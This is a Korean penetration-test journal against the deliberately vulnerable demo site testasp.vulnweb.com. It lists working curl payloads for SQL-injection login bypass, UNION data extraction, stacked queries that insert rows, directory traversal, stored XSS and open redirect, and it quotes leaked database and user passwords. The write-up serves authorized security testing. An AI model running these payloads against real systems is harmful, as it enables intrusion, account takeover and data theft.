# 서버 구조 — testphp-vulnweb-test

대상: `testasp.vulnweb.com` (44.238.29.244, AWS). 원 타겟 `testphp.vulnweb.com`(44.228.249.3)
다운으로 2026-09-23 라운드 1 이후 사용자가 scope 를 교체.

## tech_stack (교차검증 3개 일치 → 확정)

**classic ASP (VBScript) on Microsoft IIS 8.5** — ASP.NET 아님.

| 신호 | 관측값 |
|---|---|
| 응답 헤더 `Server` | `Microsoft-IIS/8.5` |
| 응답 헤더 `X-Powered-By` | `ASP.NET` (IIS 에 ASP.NET 이 설치된 흔적일 뿐, 페이지는 classic ASP) |
| 세션 쿠키 이름 | `ASPSESSIONIDAABTRDTB=<32hex>; path=/` ← **classic ASP 의 `Session.SessionID` 쿠키** (`ASP.NET_SessionId` 가 아님) |
| 페이지 확장자 | `.asp` (`Default.asp`, `showforum.asp`, `Templatize.asp` …) |
| 템플릿 방식 | Dreamweaver `<!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" -->` — 서버측 include 기반 정적 템플릿 |

DB 는 노출된 에러 메시지로 아직 확정 못 함(→ exploit 라운드의 error-based SQLi 로 확인 예정).
사이트 경고문에 "deliberately vulnerable to SQL Injections, directory traversal" 명시.

## 응답 특성 / 헤더

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
Set-Cookie: ASPSESSIONIDAABTRDTB=<...>; path=/
X-Powered-By: ASP.NET
Content-Length: <n>
```

- WAF/IPS 시그니처: **없음**(정상 요청과 공격 페이로드가 동일 지연/동일 헤더) — `waf_detected: false`
- 정적 디렉토리 리스팅 차단(`/Images/`, `/Templates/` → 403 1233 bytes), 미존재 경로는 IIS 기본 404.
- HTML 은 `iso-8859-1` 선언 + CRLF, 정적 템플릿이라 모든 페이지 골격 동일.

## 인증 방식 (재현 가능 curl)

세션 기반(classic ASP `Session`). 폼은 `action=""` = 자기 자신으로 POST, 별도 CSRF 토큰 없음.

**⚠️ Round 4 에서 이 로그인이 SQLi 로 우회됨을 확인**(아래 "확인된 취약점" 참고) — 정상 자격증명
없이도 임의 사용자명으로 인증 세션을 얻는다.

```bash
BASE=http://testasp.vulnweb.com
COOKIE=/tmp/recon/testasp.cookies

# (A) 정상 로그인 — 테스트 계정이 있을 때
curl -s -c "$COOKIE" "$BASE/Login.asp" -o /dev/null          # 세션 쿠키(ASPSESSIONID) 획득
curl -s -b "$COOKIE" -c "$COOKIE" -X POST "$BASE/Login.asp" \
  -d 'tfUName=<username>&tfUPass=<password>' -D - -o /dev/null

# (B) SQLi 인증 우회 — 실제로 동작 확인된 형태 (2026-09-23 Round 4)
curl -s -c /tmp/jar -D - -o /dev/null -X POST "$BASE/Login.asp" \
  --data "tfUName=admin'--&tfUPass=x"          # → HTTP/1.1 302 Object moved / Location: Default.asp
# 동작하는 변형: tfUName=admin'--  |  tfUPass=' OR '1'='1  |  tfUName=' OR '1'='1'--
# 동작 안 하는 변형: tfUName=' OR '1'='1  (200, 실패 페이지 그대로) / tfUName=' OR 1=1--  (500)

# (C) 우회 세션 검증 — 인증 상태인지
curl -s -b /tmp/jar "$BASE/Default.asp" | grep -o 'Logout.asp[^"]*"[^>]*>[^<]*'   # → logout admin'--
curl -s -b /tmp/jar "$BASE/showthread.asp?id=0" | grep -i frmPostMessage           # → 답글 폼 노출
```

## API 패턴

REST API 없음. **전부 서버측 렌더링되는 `.asp` 페이지 + GET/POST 파라미터**:
`showforum.asp?id=`, `showthread.asp?id=`, `Search.asp?tfSearch=`, `Login.asp`(POST), `Register.asp`(POST), `Templatize.asp?item=`.

## 데이터 흐름 (추론)

```
브라우저 → IIS(classic ASP) → ADO/OLEDB → MSSQL(추정, error-based 로 확인 예정)
  showforum.asp  : id 로 forum 행 조회 → thread 목록 렌더
  showthread.asp : id 로 thread 행 조회 + post 조회 → 게시글 렌더
  Search.asp     : tfSearch 를 LIKE 조건으로 posts 검색, 결과·검색어를 HTML 에 반사
  Templatize.asp : item 문자열을 파일 경로로 조립해 html/ 하위 조각을 include (traversal 후보)
  Login.asp      : tfUName/tfUPass 를 DB 조회 후 Session 에 사용자 저장, RetURL 로 리다이렉트(추정)
```

## 공격 표면 목록 (Round 4 기준 — ✅=검증 완료, ⏳=미시도)

| # | 엔드포인트 | 파라미터 | 취약점 | 인증 | 상태 |
|---|---|---|---|---|---|
| 1 | `/showforum.asp` | `id` | SQLi (boolean-blind, MSSQL) | 불요 | ✅ 확인 |
| 2 | `/showthread.asp` | `id` | SQLi → 전 게시글 유출(2.6MB) | 불요 | ✅ 확인 |
| 3 | `/Search.asp` | `tfSearch` | **SQLi — UNION 기반 페이지 가시 추출**(R7에서 확정) + reflected XSS | 불요 | ✅ 확인 |
| 4 | `/Templatize.asp` | `item` | **directory traversal / 임의 파일 읽기**(win.ini·hosts·web.config) | 불요 | ✅ 확인 |
| 5 | `/Login.asp` | POST `tfUName`/`tfUPass` | **SQLi 인증 우회** | 불요 | ✅ 확인 |
| 6 | `/Login.asp` | `RetURL` | **open redirect** (우회 로그인과 체이닝) | 불요 | ✅ 확인 |
| 7 | `/showthread.asp` 답글 | POST `tfText` | **stored XSS** | 우회/정상 계정 | ✅ 확인 (R8, 승인 후 실증 — 비인증 방문자에게도 실행) |
| 8 | `/Register.asp` | `tfUName` 등 | **SQLi (INSERT 문자열 연결 + stacked)** — avatar='INJECTED' 주입 성공 | 불요 | ✅ 확인 (R10) |
| 9 | users 테이블 (`/showforum.asp` 경유) | — | 블라인드 추출로 자격증명 덤프 | 불요 | ✅ 확인(R3 블라인드 / **R7 UNION 페이지 추출로 대체**) |
| 10 | `/showforum.asp`·`/showthread.asp` | `id` | **stacked query — 임의 T-SQL 문장 실행**(WAITFOR/IF 오라클로 확정) | 불요 | ✅ 확인 (R7) |
| 11 | 모든 인증 상태 페이지(메뉴) | 세션 `uname` | **XSS — 로그인 사용자명이 HTML 인코딩 없이 출력** | 불요(SQLi 우회와 체이닝) | ✅ 확인 (R7) |
| 12 | DB `acuforum` 전 테이블 | `id`(stacked) | **임의 DML** — users 1행 INSERT 후 정상 로그인 성공으로 실증 | — | ✅ 확인 (R8, 승인 후 최소 실증) |
| 13 | DB `acublog`·`acuservice` | — | **교차 DB 읽기**(다른 앱 DB의 users/news/comments 접근, ccnumber 컬럼까지) | — | ✅ 메타데이터/행수로 확인 (R7) |
| 14 | `/showthread.asp` 답글 | POST (세션 사용자명) | **second-order SQLi** — `Session("uname")` 이 `posts.poster` 로 무이스케이프 → 게시 INSERT 파괴(500). 데이터 주입은 불가(상호 배타 제약) | 우회 가능 | ✅ 확인 (R10) |
| 15 | `/Login.asp` | POST `tfUName` | **stacked query (인증 전)** — `x'; WAITFOR DELAY '0:0:04'--` → 200 응답이 4.37s | 불요 | ✅ 확인 (R10) |
| 16 | 파일 업로드(PUT) | — | 웹셸/RCE 경로 | — | ❌ 불가 (R10: PUT 404, 파일 미생성) |
| 17 | 인접 앱 DB 쓰기 | — | `acublog.dbo.users` UPDATE / `acublog.dbo.comments` INSERT / `acuservice.dbo.users` UPDATE | — | ✅ 권한 오라클만 확인 (R11, 쓰기 미실행) |

### 재현용 curl — directory traversal (Round 4)

```bash
BASE=http://testasp.vulnweb.com
# 평문 ../ 만 통한다(인코딩 변형은 500). 응용 루트 상위로 무한 상승 가능.
curl -s "$BASE/Templatize.asp?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
curl -s "$BASE/Templatize.asp?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts"
curl -s "$BASE/Templatize.asp?item=html/../web.config"     # web.config 전체 유출
```

### 재현용 curl — open redirect (Round 4)

```bash
curl -s -D- -o /dev/null -c /tmp/j2 -X POST \
  "$BASE/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F" \
  --data "tfUName=admin'--&tfUPass=x"
# → HTTP/1.1 302 Object moved / Location: http://example.com/
```

## 소스 유출로 확정된 내부 구조 (Round 5 — `Templatize.asp` traversal 경유)

`item=<루트 기준 상대경로>` 로 .asp 파일이 **실행되지 않고 include** 되므로 소스 평문이 나온다.
응답 원문: `evidence/source_leak/*.txt`.

**DB 접속 (db.asp:31)**

```vbscript
conn.Open "Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=acunetixtrustno1;"
```

→ MSSQL(SQLNCLI11), `(local)\SQL` 인스턴스, DB `acuforum`, 계정 `acunetix`. (Round 3 블라인드
추출의 `SYSTEM_USER='acunetix'` 와 일치.)

**취약 쿼리 원문 (그대로 주입 가능)**

```vbscript
' Login.asp:8
sql = "SELECT uname, upass FROM users WHERE uname='" & Request.Form("tfUName") & "' AND upass='" & Request.Form("tfUPass") & "'"
Session.Contents("uname") = Request.Form("tfUName")          ' 검증 없이 세션 사용자명으로 저장

' showforum.asp:9   (2컬럼)
rs.Open "SELECT name, descr FROM forums WHERE id=" & Request.QueryString("id"), conn

' showthread.asp:9  (4컬럼: title, forumid, threadid, name)
rs.Open "SELECT b.title, b.forumid, b.id as threadid, a.name FROM forums a, threads b WHERE a.id = b.forumid AND b.id=" & Request.QueryString("id"), conn

' Search.asp:78
sql = "SELECT DISTINCT(a.id) as postid, ... FROM posts a, users b, threads c, forums d WHERE ... AND (CHARINDEX(a.title, '"&st&"')>0 OR CHARINDEX(a.message,'"&st&"')>0)"
```

UNION 기반은 **showforum/showthread 에서는** 컬럼 수를 알아도 성립하지 않는다 — 같은 `id` 가
컬럼 수가 다른 3~4개 쿼리에 재사용되기 때문(전부 500). 이 엔드포인트의 추출 경로는 **서브쿼리
boolean 오라클**(`id=1 AND (SELECT ...)=...`)이다.
**단 `Search.asp` 는 예외로 UNION 이 성립한다**(Round 7 확정 — 파라미터가 쿼리 1개에만 쓰이고
`q')>0) UNION ALL SELECT <10컬럼>--` 로 괄호를 닫으면 페이지에 결과가 렌더됨).

**게시글 입력 필터 (stored XSS 성립 조건 — 소스 근거 + Round 8 실증 완료)**

```vbscript
If InStr(1, Request.Form("tfText"),    "<a href=") > 0 then Response.End
If InStr(1, Request.Form("tfSubject"), "<a href=") > 0 then Response.End
```

차단 문자열이 `<a href=` 하나뿐 → `<script>`, `<img src=x onerror=…>`, `<svg onload=…>` 는 통과.
본문은 `Replace(..., "'", "''")` 로 따옴표만 이스케이프되고 **HTML 인코딩은 없음**.

**⚠️ 위험 경로 (절대 건드리지 말 것)**

```vbscript
' showforum.asp:29 / showthread.asp:21
if rs.fields.item("total") > 100 then
  conn.Execute "DELETE FROM threads WHERE forumid=" & Request.QueryString("id")
  conn.Execute "DELETE FROM posts   WHERE forumid=" & Request.QueryString("id")
```

로그인 + POST + 주입된 `id` 조합 시 해당 포럼 스레드/게시글이 **일괄 삭제**된다. POST 계열
페이로드에서는 `id` 를 주입하지 않는다.

**파일 쓰기 프리미티브 존재 (logInput.asp)**

```vbscript
function WriteToFile(FileName, Contents, Append)  ' Scripting.FileSystemObject.OpenTextFile
' 호출부: WriteToFile "C:\scripts\logInput.txt", dataStr, True   (현재 주석 처리됨)
```

웹셸 업로드는 아니지만 앱이 파일시스템 쓰기 코드를 포함하고 있고, 경로(`C:\scripts\`)가 소스에 노출.

## Round 7 (2026-09-28, phase 2) 추가 확정 — UNION 페이지 추출 / stacked query / 권한

이전 phase 결론 중 **"UNION 불가"는 잘못된 결론**이었다(페이로드 형태 문제). 정정한다.

### 1) UNION 기반 페이지 가시 추출 — `/Search.asp?tfSearch=` (확정)

Search.asp 는 같은 파라미터가 **쿼리 1개에만** 쓰인다(showforum/showthread 는 컬럼 수가 다른
3~4개 쿼리에 재사용되어 UNION 컬럼 수를 맞출 수 없음 — 이쪽은 여전히 불가). Search 쿼리 구조:

```vbscript
... AND (CHARINDEX(a.title, '<st>')>0 OR CHARINDEX(a.message,'<st>')>0)
sql = "SELECT DISTINCT(a.id) as postid, a.poster, a.title, a.message, a.forumid, a.threadid, a.postdate, b.avatar, c.title as ttitle, d.name FROM posts a, users b, threads c, forums d WHERE ..."  ' 10컬럼
```

`tfSearch` 를 `q')>0) UNION ALL SELECT <10컬럼>--` 형태로 넣으면 **괄호·WHERE 를 정상 종료**시키고
UNION 이 성립하며, 그 SELECT 결과가 페이지에 그대로 렌더된다(poster/title/message/ttitle/name).
→ 블라인드 오라클 없이 **요청 1개로 임의 데이터가 화면에 출력**된다.

```bash
# 검증 (응답 HTML 의 posttitle/posttext div 에 값이 그대로 찍힘)
curl -s "http://testasp.vulnweb.com/Search.asp?tfSearch=q%27)%3E0)%20UNION%20ALL%20SELECT%201,%27ACU-POSTER%27,%27ACU-TITLE%27,%27ACU-MESSAGE%27,1,1,GETDATE(),%27A%27,%27TT%27,%27FN%27--"
```

이 경로로 실제로 빼낸 것(증거 `evidence/r7/U_*.html`):
`@@version` = **Microsoft SQL Server 2014 (SP3-GDR) 12.0.6179.1 (X64) Express Edition on Windows NT 6.3 (Build 9600)**, `DB_NAME()`=`acuforum`,
`SUSER_SNAME()`=`acunetix`, 테이블=`threads,users,forums,posts`,
`users` 컬럼=`uname,upass,email,realname,avatar`, `posts` 컬럼=`id,forumid,threadid,poster,title,message,postdate,SSMA_TimeStamp`,
`users` 1건(`uname=netsparker(0x001DFE)`, `upass=Inv1@cti`, `email=invicti@example.com` — **평문 비밀번호**), 행 수 users=453/posts=21/threads=8/forums=3.

### 2) stacked query — 임의 T-SQL 배치 실행 (확정, RCE 아님)

`id` 파라미터에 `;` 로 문장을 이어붙이면 **실행된다**. 증거(차분 타이밍 오라클, `showthread.asp` — 페이지가 같은 id 로 쿼리를 2회 실행하므로 지연이 2배로 나타남):

| 요청 | 응답시간 |
|---|---|
| `showthread.asp?id=0;IF 1=1 WAITFOR DELAY '0:0:04'--` | **8.51s** |
| `showthread.asp?id=0;IF 1=2 WAITFOR DELAY '0:0:04'--` | 0.59s |
| `showthread.asp?id=0` (기준선) | 0.48s |

`showforum.asp` 에서는 지연값에 비례(1s→3.37s, 3s→9.52s, 8s→24.35s — 쿼리 3회 실행).
→ 단순 boolean/blind 를 넘어 **서버측 임의 문장 실행**. 다만 `xp_cmdshell`/Ole Automation 은
비활성이고 로그인은 sysadmin 이 아니므로 **OS 명령 실행(RCE)은 불가**.

### 3) DB 권한 (조건부 지연 오라클로 확인 — 쓰기 없음)

| 확인 | 결과 |
|---|---|
| `IS_SRVROLEMEMBER('sysadmin')` | false |
| `IS_SRVROLEMEMBER('securityadmin')` | false |
| `IS_MEMBER('db_owner')` | false |
| `IS_MEMBER('db_datawriter')` | **true** |
| `IS_MEMBER('db_datareader')` | **true** |
| `SUSER_SNAME()='acunetix'` | **true** |
| `HAS_PERMS_BY_NAME('posts','OBJECT','INSERT')=1` | **true** |

→ `acuforum` 전 테이블에 **읽기+쓰기** 가능(users.upass 변경 = 전 사용자 계정 탈취 가능).
쓰기 실증은 SOUL 규칙상 사전 승인 대상이라 실행하지 않았다.

### 4) 교차 DB 접근 (확정 — 메타데이터/행수만 확인, 값 추출 안 함)

`sys.databases` = `master,tempdb,model,msdb,acublog,acuforum,acuservice` (앱 DB 3개).
동일 SQL 로그인으로 **다른 애플리케이션 DB의 데이터까지 접근 가능**:
`acublog.users`(1행, 컬럼 `uname,upass,alevel`), `acublog.news`(3행), `acublog.comments`(63행),
`acuservice.users`(2행, 컬럼 `id,username,password,name,joindate,ccnumber,ccverification,address`
 — **카드번호/검증코드 컬럼 존재**). 값은 추출하지 않았다(범위 최소화).

### 5) XSS — 세션 사용자명 미인코딩 출력 (확정, 쓰기 없음)

`Login.asp:37` 이 `Session.Contents("uname") = Request.Form("tfUName")` 로 **검증 없이** 저장하고,
모든 페이지의 메뉴가 `... >logout " & Session.Contents("uname") & "</a>"` 로 **HTML 인코딩 없이** 출력한다.

```bash
curl -s -c /tmp/j -X POST "http://testasp.vulnweb.com/Login.asp" \
  --data-urlencode "tfUName=<img src=x onerror=alert(document.domain)>' OR '1'='1'--" --data "tfUPass=x" -o /dev/null
curl -s -b /tmp/j "http://testasp.vulnweb.com/Default.asp" | grep -o 'logout <img[^<]*'
# → logout <img src=x onerror=alert(document.domain)>' OR '1'='1'--
```

SQLi 인증 우회와 같은 요청에서 성립(로그인 1회로 세션에 저장 → 전 페이지 반사). 자가 제출 폼으로
로그인 CSRF 와 체이닝하면 피해자 브라우저에서 실행 가능.

### 6) 이번 라운드 음성 결과 (재시도 방지용)

- `RetURL` CRLF/헤더 인젝션: **불가** — ASP `Response.Redirect` 가 CRLF 를 `%0D%0A` 로 인코딩해
  `Location` 에 그대로 남는다(응답 분할 안 됨).
- traversal 잔여 파일: `C:\scripts\logInput.txt`, `Default.asp.bak`, `web.config.bak`,
  `global.asa`, `boot.ini`, IIS `applicationHost.config`, `inetpub\wwwroot\web.config` → **전부 500(없음/권한없음)**.
  읽히는 건 이미 알려진 `windows/*`·앱 루트의 `.asp` 소스뿐.
- 미발견 엔드포인트 열거(post/showposts/users/admin/edit/delete/upload/download/forum/thread/
  newthread/postmessage/profile/members/conn/config/include/header/footer + .bak) → **전부 404**.
- `/Register.asp` 는 소스상 `INSERT INTO users (...) VALUES ('<tfUName>','<tfUPass>','<tfEmail>','<tfRName>','')`
  로 **직접 문자열 연결**(SQLi 후보) — **Round 10 에서 승인 후 검증 완료**
  (302 + 4.35s stacked, `avatar='INJECTED'`, 정상 로그인 성공). 상세는 아래 9절.


### 7) Round 8 (2026-09-28) — 승인 후 쓰기 실증 결과

phase 2 승인(2026-09-28 "1번, 2번 모두 승인")에 따라 실행. 만든 데이터는 **users 1행 + 게시글 1건**뿐
(기존 행 UPDATE/DELETE 없음, 포럼 일괄삭제 트리거 경로 미접촉).

```bash
# (1) 임의 DML 실증 — stacked query 로 users 1행 생성 (멱등 가드)
curl -s "$BASE/showthread.asp?id=0%3BIF%20NOT%20EXISTS(SELECT%201%20FROM%20users%20WHERE%20uname%3D%27acu-r7%20proof%27)%20INSERT%20INTO%20users%20(uname,upass,email,realname,avatar)%20VALUES%20(%27acu-r7%20proof%27,%27P%40ss-r7%27,%27r7%40example.com%27,%27r7%27,%27%27)--"
#  → 200. 검증: UNION COUNT=1 / upass=P@ss-r7 / realname=r7
#  → 정상 로그인 폼으로 acu-r7 proof / P@ss-r7 → 302 Location: Default.asp, 메뉴가 'logout acu-r7 proof'
#  → users 453 → 454 (+1)

# (2) stored XSS 실증 — 답글 1건 (쿼리스트링 id 는 주입하지 않음)
curl -s -b jar -X POST "$BASE/showthread.asp?id=0" \
  --data-urlencode 'tfSubject=acuredteam-r8-xss-proof' \
  --data-urlencode 'tfText=<img src=x onerror=alert(document.domain)>'
#  → 재방문 HTML: <div class='posttext'><img src=x onerror=alert(document.domain)></div>
#  → HTML 인코딩 없음, 쿠키 없는 비인증 요청에서도 동일 렌더(모든 방문자 실행)
#  → 응답 헤더에 CSP 없음(Cache-Control/Content-Type/Server/Set-Cookie/X-Powered-By 만) → 인라인 핸들러 차단 요소 없음
```

격상된 결론: SQLi 는 **앱 정상 인증 흐름에 반영되는 임의 행 생성**까지 가능(같은 기법으로 기존
사용자 `upass` 변경 = 전 사용자 계정 탈취). stored XSS 는 **비인증 방문자 대상 실행**으로 확정.


### 8) Round 9 (2026-09-28) — 세션/인증 로직·쿠키 속성 (읽기 전용, 확정)

- **세션 쿠키 속성**: `Set-Cookie: ASPSESSIONIDCCCTQDSA=<32hex>; path=/` — `HttpOnly` `Secure`
  `SameSite` **전부 없음**. 세션 값 자체가 인증 상태(`Session.Contents("uname")`)이므로
  확정된 stored XSS 와 체이닝하면 `document.cookie` 로 세션 탈취 → 계정 탈취.
- **HTTPS 미제공**: `https://testasp.vulnweb.com` 443 타임아웃(`000`) → 쿠키/자격증명이 평문
  HTTP 로만 오간다(`Secure` 부재가 실질 위험으로 이어짐).
- **세션 ID 미회전**: 로그인 POST 응답에 `Set-Cookie` 가 없음 → 인증 성립 시 세션 ID 재발급
  없음(세션 고정 패턴; 공격자가 ID 를 심을 벡터는 없어 단독 취약점은 아님).
- **로그아웃**: `Logout.asp` 는 `Session.Contents.Remove("uname")` 만 수행 → 인증은 해제되지만
  세션 객체/ID 는 유지(같은 ID 재사용 가능).
- **open redirect 2차 경로**: `Logout.asp?RetURL=http://example.com/` → **302 Location:
  http://example.com/** (`//example.com/` 도 통과). 소스상 `Register.asp` 도 동일 패턴 → 앱 전역.
- **프로토콜/헤더**: `Allow: OPTIONS, TRACE, GET, HEAD, POST`(PUT/DELETE 없음), `TRACE` → 501,
  `PUT` → **Round 10 에서 404 확정**(파일 미생성, 업로드 경로 없음), IIS 8.3 단축명 9종 → 전부 404,
  `CSP`/`X-Frame-Options`/`X-Content-Type-Options`/`HSTS`/`Referrer-Policy`/`Permissions-Policy`
  **전부 없음**(CSP 부재 = stored XSS 실행을 막는 요소 없음의 직접 근거).


### 9) Round 10~11 (2026-09-28) — Register SQLi · second-order · RCE 부재 · 교차 DB 쓰기 권한

**`/Register.asp` SQLi 확정(3중 증명).** 소스는 `INSERT INTO users (uname,upass,email,realname,avatar)
VALUES ('<tfUName>','<tfUPass>','<tfEmail>','<tfRName>','')` 로 직접 연결. 정상 경로는 `avatar` 를
항상 `''` 로 하드코딩하므로, `avatar` 를 조작하면 주입이 증명된다.

```bash
curl -s -X POST "$BASE/Register.asp" \
  --data-urlencode "tfUName=acu-r9-reg','RegR9!','r9@example.com','r9','INJECTED') ; IF 1=1 WAITFOR DELAY '0:0:04'--" \
  --data-urlencode "tfUPass=RegR9!" --data-urlencode "tfEmail=r9@example.com" --data-urlencode "tfRName=r9"
# → 302 Location: Login.asp?RetURL=  이며 4.35초(stacked 까지 실행)
# → UNION 검증: SELECT avatar FROM users WHERE uname='acu-r9-reg' = 'INJECTED'
# → 정상 로그인 acu-r9-reg / RegR9! → 302 (계정 사용 가능)
```

**second-order — 확정, 단 임팩트는 "게시 기능 파괴"로 한정.**

```vbscript
' showthread.asp:60 / showforum.asp:73 — poster 만 이스케이프 없음
sql = sql & "'" & Session.Contents("uname") & "',"                  ' 무이스케이프
sql = sql & "'" & Replace(Request.Form("tfSubject"), "'", "''", 1, -1, 1) & "...", ' 이스케이프됨
```
따옴표가 포함된 사용자명(=로그인 SQLi 우회로 세션에 들어간 문자열)으로 답글 POST → **500**,
정상 계정은 200(대조군). 데이터 주입은 불가 — 로그인이 성립하는 문자열은 `VALUES (...)` 목록에서
반드시 구문 오류가 되어 두 제약이 상호 배타적이다. **`Login.asp` 의 `tfUName` 에서도 stacked 가
성립**(`x'; WAITFOR DELAY '0:0:04'--` → 200 응답 4.37초)해 인증 전 임의 문장 실행 경로가 하나 더 있다.

**RCE 부재(확정, 근거 5개).** ① `sysadmin` 아님 ② `xp_cmdshell`·Ole Automation `value_in_use=0`
③ `PUT /r10probe.txt` → 404(파일 미생성, `Allow` 헤더에 PUT/DELETE 없음) ④ `bulkadmin`/
`ADMINISTER BULK OPERATIONS` false ⑤ `ALTER`/`CONTROL` 권한 false.
(`OBJECT_ID('xp_cmdshell')` 류 조회는 확장 프로시저가 `sys.objects` 에 그렇게 등록되지 않아
**판정 방법이 틀렸음** — 음성 근거로 쓰지 않는다.)

**교차 DB 쓰기 권한(오라클만, 실제 쓰기 없음).** `acublog.dbo.users` UPDATE / `acublog.dbo.comments`
INSERT / `acuservice.dbo.users` UPDATE **모두 true** → in-scope SQLi 하나로 인접 앱 DB(카드번호
컬럼 포함)까지 읽고 쓸 수 있다. `ALTER`/`CONTROL`/bulk 계열은 false.

**운영 제약.** 일일 초기화가 실제로 동작함을 관찰(users 454→5, posts 22→6, Round 8 산출물 소멸)
— 모든 증거는 캡처 시각 기준으로만 유효하다. 검증 스크립트는 쓰기 없이 재현 가능한 항목만 쓴다.


### 10) Round 12 (2026-09-28) — 재현 검증 체인 (읽기 전용, 쓰기 없음)

`scripts/verify_chain.sh` — phase 2 확정 취약점 9종을 **24개 체크**로 한 번에 재확인한다.
**결과: PASS=24 / FAIL=0**(1차 실행에서 FAIL 1건은 스크립트 결함이었음 — `Login.asp` 의
`Response.Redirect` 는 로그인 POST 성공 시에만 실행되므로 자격증명 없는 GET 으로는
리다이렉트가 나오지 않는다. POST 로 수정 후 전항목 PASS).

```bash
cd journal/web/testphp-vulnweb-test && bash scripts/verify_chain.sh
# B=http://testasp.vulnweb.com  P="-x http://127.0.0.1:8080 --cacert ..." 로 대상/프록시 교체 가능
# 체크: 도달성/헤더 · boolean-blind SQLi · UNION 페이지 추출 · stacked 차분 오라클 ·
#       traversal(win.ini/web.config) · 소스+자격증명 · 인증 우회 · open redirect(Login/Logout) ·
#       reflected XSS · 쿠키 플래그 · 보안 헤더 · 교차 DB 읽기 · 음성 재확인(PUT/TRACE/8.3/CRLF)
```

사이트가 매일 초기화되므로 이 스크립트가 "언제든 다시 확인 가능한" 유일한 재현 수단이다
(쓰기 기반 증명은 `evidence/` 캡처와 일지의 타임스탬프로만 유효).

## 환경 메모

- 재현 프록시: `-x http://127.0.0.1:8080 --cacert /home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem`
  → mitmdump 가 `.phase-runtime/current/mitmdump.log` 에 캡처를 남기는 것 확인됨.
- **browser toolset 사용 불가**: 2026-09-23 시도 시 탭이 `chrome-error://chromewebdata/`
  로 끝나고 `Page.captureScreenshot` 이 60s 타임아웃 — 이 환경의 브라우저 백엔드 문제.
  classic ASP SSR 사이트라 curl 기반 관찰로 충분하지만, JS 렌더링이 필요한 경우 이 제약을
  먼저 해결해야 함.
- 설치된 공격 도구: `curl`, `wget`, `python3` 뿐 (nmap/ffuf/httpx/nuclei/sqlmap/nikto/gobuster
  모두 미설치) → 페이로드는 curl/python3 로 직접 구성한다.
